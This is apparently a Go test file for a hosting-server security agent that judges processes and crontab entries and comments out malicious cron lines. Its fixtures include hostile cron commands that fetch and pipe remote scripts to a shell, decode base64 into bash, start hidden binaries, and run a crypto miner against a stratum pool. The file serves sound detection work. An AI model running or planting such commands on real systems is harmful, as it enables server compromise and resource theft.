package monitor

import (
	"io"
	"log/slog"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/xmarthost/xmartguard/agent/internal/settings"
	"github.com/xmarthost/xmartguard/agent/internal/store"
)

func TestJudge(t *testing.T) {
	cases := []struct {
		p    ProcInfo
		home string
		bad  bool
	}{
		{ProcInfo{Exe: "/usr/bin/php", Cmdline: "php /home/u/public_html/cron.php"}, "/home/u", false},
		{ProcInfo{Exe: "/home/u/public_html/wp-content/.x/kworker", Cmdline: "kworker"}, "/home/u", true},
		{ProcInfo{Exe: "/tmp/.ICE/sd", Cmdline: "sd"}, "/home/u", true},
		{ProcInfo{Exe: "/home/u/bin/app (deleted)", Cmdline: "app"}, "/home/u", true},
		{ProcInfo{Exe: "/usr/bin/python3", Cmdline: "python3 miner.py -o stratum+tcp://pool.example:3333"}, "/home/u", true},
		{ProcInfo{Exe: "/usr/bin/node", Cmdline: "node /home/u/app/server.js"}, "/home/u", false},
		// PHP updated while old lsphp processes run: not malware.
		{ProcInfo{Exe: "/opt/cpanel/ea-php81/root/usr/bin/lsphp (deleted)", Cmdline: "lsphp"}, "/home/u", false},
		{ProcInfo{Exe: "/usr/local/lsws/lsphp82/bin/lsphp (deleted)", Cmdline: "lsphp"}, "/home/u", false},
		{ProcInfo{Exe: "/opt/alt/php74/usr/bin/lsphp (deleted)", Cmdline: "lsphp"}, "/home/u", false},
		{ProcInfo{Exe: "/memfd:x (deleted)", Cmdline: "kworker"}, "/home/u", true},
		{ProcInfo{Exe: "/tmp/.x/run (deleted)", Cmdline: "run"}, "/home/u", true},
	}
	for _, c := range cases {
		if _, bad := Judge(c.p, c.home); bad != c.bad {
			t.Errorf("%+v: got %v", c.p, bad)
		}
	}
}

func TestJudgeCron(t *testing.T) {
	bad := []string{
		"*/5 * * * * curl -fsSL http://198.51.100.9/x.sh | sh",
		"* * * * * wget -q -O /tmp/.s http://198.51.100.9/s",
		"@reboot /dev/shm/.k/run >/dev/null 2>&1",
		"*/10 * * * * echo aGVsbG8K | base64 -d | bash",
		"@reboot /home/u/.config/.x/run",
		"* * * * * /usr/local/bin/php /home/u/public_html/wp-content/uploads/2024/05/cache.php",
		"*/30 * * * * GS_ARGS=\"-k abc -liqD\" /home/u/.config/htop/defunct",
		"* * * * * /home/u/.kinsing",
	}
	good := []string{
		"# comment",
		"MAILTO=user@example.com",
		"*/15 * * * * /usr/local/bin/php /home/u/public_html/wp-cron.php >/dev/null 2>&1",
		"0 3 * * * /usr/bin/mysqldump db > /home/u/backup.sql",
		"0 * * * * /usr/local/bin/php /home/u/public_html/artisan schedule:run >> /dev/null 2>&1",
		"@reboot /home/u/bin/node-app-start.sh",
		"#xpguard-disabled# * * * * * curl http://x/a | sh",
	}
	for _, l := range bad {
		if _, b := JudgeCron(l); !b {
			t.Errorf("not flagged: %s", l)
		}
	}
	for _, l := range good {
		if r, b := JudgeCron(l); b {
			t.Errorf("flagged (%s): %s", r, l)
		}
	}
}

func TestCheckCronOnce(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("XG_STATE_DIR", filepath.Join(dir, "state"))
	t.Setenv("XG_CONFIG_DIR", filepath.Join(dir, "conf"))
	db, _ := store.Open()
	defer db.Close()
	st, _ := settings.Load()
	cron := filepath.Join(dir, "cron")
	os.MkdirAll(cron, 0o755)
	os.WriteFile(filepath.Join(cron, "bob"), []byte("*/5 * * * * curl -s http://198.51.100.9/a | bash\n"), 0o600)
	os.WriteFile(filepath.Join(cron, "trusted"), []byte("*/5 * * * * curl -s http://198.51.100.9/a | bash\n"), 0o600)
	st.Patch([]byte(`{"cron":{"whitelist_users":["trusted"]}}`))
	var got []Event
	st.Patch([]byte(`{"cron":{"disable":false}}`))
	m := &Monitor{DB: db, Settings: st, Log: slog.New(slog.NewTextHandler(io.Discard, nil)), CronDirs: []string{cron}, OnEvent: func(e Event) { got = append(got, e) }}
	m.CheckCron()
	m.CheckCron()
	if len(got) != 1 || got[0].User != "bob" {
		t.Fatalf("events: %+v", got)
	}
	evs, total, _ := m.Events("cron", 10, 0)
	if total != 1 || evs[0].Reason == "" {
		t.Fatalf("stored: %+v", evs)
	}
}

// Like cPGuard: malicious lines are commented out, the rest of the crontab
// is kept, and the administrator can switch a line back on for good.
func TestCronDisableAndEnable(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("XG_STATE_DIR", filepath.Join(dir, "state"))
	t.Setenv("XG_CONFIG_DIR", filepath.Join(dir, "conf"))
	Crontab = ""
	db, _ := store.Open()
	defer db.Close()
	st, _ := settings.Load()
	if !st.Get().Cron.Disable {
		t.Fatal("disabling must be on by default")
	}
	cron := filepath.Join(dir, "cron")
	os.MkdirAll(cron, 0o755)
	good := "*/15 * * * * /usr/local/bin/php /home/bob/public_html/wp-cron.php >/dev/null 2>&1"
	bad := "*/5 * * * * curl -s http://198.51.100.9/a | bash"
	evil := "* * * * * /usr/local/bin/php /home/bob/public_html/x/y.php"
	file := filepath.Join(cron, "bob")
	os.WriteFile(file, []byte("MAILTO=\"\"\n"+good+"\n"+bad+"\n"+evil+"\n"), 0o600)
	// y.php is a file the scanner found.
	db.Exec(`INSERT INTO findings (source, path, category, signature, status, created_at, updated_at) VALUES ('manual','/home/bob/public_html/x/y.php','virus','php.webshell','quarantined',1,1)`)
	var got []Event
	m := &Monitor{DB: db, Settings: st, Log: slog.New(slog.NewTextHandler(io.Discard, nil)), CronDirs: []string{cron}, OnEvent: func(e Event) { got = append(got, e) }}
	m.CheckCron()
	b, _ := os.ReadFile(file)
	want := "MAILTO=\"\"\n" + good + "\n" + DisabledPrefix + bad + "\n" + DisabledPrefix + evil + "\n"
	if string(b) != want {
		t.Fatalf("crontab:\n%s", b)
	}
	if len(got) != 2 || got[0].Action != "disabled" || got[1].Reason != "runs a file detected as malware" {
		t.Fatalf("events %+v", got)
	}
	m.CheckCron() // nothing left to do
	if len(got) != 2 {
		t.Fatalf("again: %+v", got)
	}
	if err := m.EnableCron("bob", bad); err != nil {
		t.Fatal(err)
	}
	m.CheckCron()
	b, _ = os.ReadFile(file)
	if !strings.Contains(string(b), "\n"+bad+"\n") || len(got) != 2 {
		t.Fatalf("re-enabled line disabled again:\n%s %+v", b, got)
	}
	if fi, _ := os.Stat(file); fi.Mode().Perm() != 0o600 {
		t.Fatal("mode changed")
	}
}

// Node.js apps run by PM2 from nvm (a hidden folder) and other developer
// tools are normal; hidden or temporary folders elsewhere are suspicious,
// miners and reverse shells malicious.
func TestAssessLevels(t *testing.T) {
	home := "/home/vibe"
	cases := []struct {
		p    ProcInfo
		want Level
	}{
		{ProcInfo{Exe: home + "/.nvm/versions/node/v20.11.0/bin/node", Cmdline: "PM2 v5.3.1: God Daemon (/home/vibe/.pm2)"}, Clean},
		{ProcInfo{Exe: home + "/.nvm/versions/node/v20.11.0/bin/node", Cmdline: "node /home/vibe/app/server.js"}, Clean},
		{ProcInfo{Exe: home + "/.nvm/versions/node/v20.10.0/bin/node (deleted)", Cmdline: "next-server (v14.2.3)"}, Clean},
		{ProcInfo{Exe: home + "/.bun/bin/bun", Cmdline: "bun run start"}, Clean},
		{ProcInfo{Exe: home + "/.cache/puppeteer/chrome/linux-126/chrome-linux64/chrome", Cmdline: "chrome --headless"}, Clean},
		{ProcInfo{Exe: home + "/public_html/node_modules/@esbuild/linux-x64/bin/esbuild", Cmdline: "esbuild --service"}, Clean},
		{ProcInfo{Exe: home + "/.config/.x/kworker", Cmdline: "kworker"}, Suspicious},
		{ProcInfo{Exe: "/tmp/.ICE/sd", Cmdline: "sd"}, Suspicious},
		{ProcInfo{Exe: home + "/.nvm/versions/node/v20/bin/node", Cmdline: "node x.js -o stratum+tcp://pool.example:3333"}, Malicious},
	}
	for _, c := range cases {
		if _, got := Assess(c.p, home); got != c.want {
			t.Errorf("%s | %s: got %d, want %d", c.p.Exe, c.p.Cmdline, got, c.want)
		}
	}
}

// Only malicious processes die at once; suspicious ones only after keeping a
// CPU core busy for a long time, never for a short spike.
func TestShouldKill(t *testing.T) {
	for _, c := range []struct {
		level        Level
		age          time.Duration
		life, recent float64
		want         bool
	}{
		{Malicious, time.Second, 0, 0, true},
		{Suspicious, 2 * time.Hour, 0.95, 0.98, true},
		{Suspicious, 10 * time.Minute, 1, 1, false},   // young: a build or a start-up
		{Suspicious, 5 * time.Hour, 0.9, 0.1, false},  // quiet now
		{Suspicious, 5 * time.Hour, 0.05, 0.9, false}, // a short spike of an idle process
		{Suspicious, 5 * time.Hour, 0.6, 0.7, true},
		{Clean, 5 * time.Hour, 1, 1, false},
	} {
		if got := ShouldKill(c.level, c.age, c.life, c.recent); got != c.want {
			t.Errorf("%+v: got %v", c, got)
		}
	}
}

func TestParseStat(t *testing.T) {
	stat := "4242 (node server.js) S 1 4242 4242 0 -1 4194560 12 0 0 0 1500 250 0 0 20 0 11 0 987654 1234 56 18446744073709551615"
	start, cpu := parseStat(stat)
	if start != 987654 || cpu != 1750 {
		t.Fatalf("start %d cpu %d", start, cpu)
	}
}

// PM2 at boot from nvm is normal: not flagged. A hidden folder elsewhere is
// reported but not switched off; lines an older version switched off are
// switched back on, real malware stays off.
func TestCronDevToolsAndRestore(t *testing.T) {
	for _, l := range []string{
		"@reboot /home/vibe/.nvm/versions/node/v20.11.0/bin/pm2 resurrect",
		"@reboot cd /home/vibe/app && /home/vibe/.nvm/versions/node/v20.11.0/bin/node server.js > /dev/null 2>&1",
		"*/5 * * * * /home/vibe/.bun/bin/bun /home/vibe/app/job.ts > /dev/null 2>&1",
	} {
		if r, lv := AssessCron(l); lv != Clean {
			t.Errorf("flagged (%s): %s", r, l)
		}
	}
	if _, lv := AssessCron("@reboot /home/u/.config/.x/run"); lv != Suspicious {
		t.Errorf("hidden program: %d", lv)
	}
	dir := t.TempDir()
	t.Setenv("XG_STATE_DIR", filepath.Join(dir, "state"))
	t.Setenv("XG_CONFIG_DIR", filepath.Join(dir, "conf"))
	Crontab = ""
	db, _ := store.Open()
	defer db.Close()
	st, _ := settings.Load()
	cron := filepath.Join(dir, "cron")
	os.MkdirAll(cron, 0o755)
	pm2 := "@reboot /home/vibe/.nvm/versions/node/v20.11.0/bin/pm2 resurrect"
	hidden := "@reboot /home/vibe/.config/.x/run"
	bad := "*/5 * * * * curl -s http://198.51.100.9/a | bash"
	file := filepath.Join(cron, "vibe")
	os.WriteFile(file, []byte(DisabledPrefix+pm2+"\n"+hidden+"\n"+DisabledPrefix+bad+"\n"), 0o600)
	var got []Event
	m := &Monitor{DB: db, Settings: st, Log: slog.New(slog.NewTextHandler(io.Discard, nil)), CronDirs: []string{cron}, OnEvent: func(e Event) { got = append(got, e) }}
	m.CheckCron()
	b, _ := os.ReadFile(file)
	if string(b) != pm2+"\n"+hidden+"\n"+DisabledPrefix+bad+"\n" {
		t.Fatalf("crontab:\n%s", b)
	}
	actions := map[string]string{}
	for _, e := range got {
		actions[e.Subject] = e.Action
	}
	if actions[pm2] != "restored" || actions[hidden] != "alerted" || len(got) != 2 {
		t.Fatalf("events %+v", got)
	}
}
